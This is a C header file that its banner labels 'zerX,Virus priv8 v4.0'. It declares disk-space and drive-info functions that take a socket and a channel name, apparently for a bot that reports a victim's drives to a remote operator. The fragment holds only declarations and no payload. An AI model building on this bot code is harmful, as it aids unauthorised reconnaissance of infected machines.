/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/
typedef struct DKSP
{
	__int64 AvailableBytes;
	__int64 FreeBytes;
	__int64 TotalBytes;

} DKSP;

typedef struct DKSPKB
{
	char AvailableKB[128];
	char FreeKB[128];
	char TotalKB[128];
	
} DKSPKB;

BOOL FileExists(char *filename, int mode=04);
const char *commaI64(unsigned __int64 number);
const char *DriveType(LPCSTR Drive);
DKSP DiskSpace(LPCSTR Drive);
DKSPKB DiskSpaceKB(LPCSTR Drive);
void DriveSpace(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive);
void DriveInfo(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive);
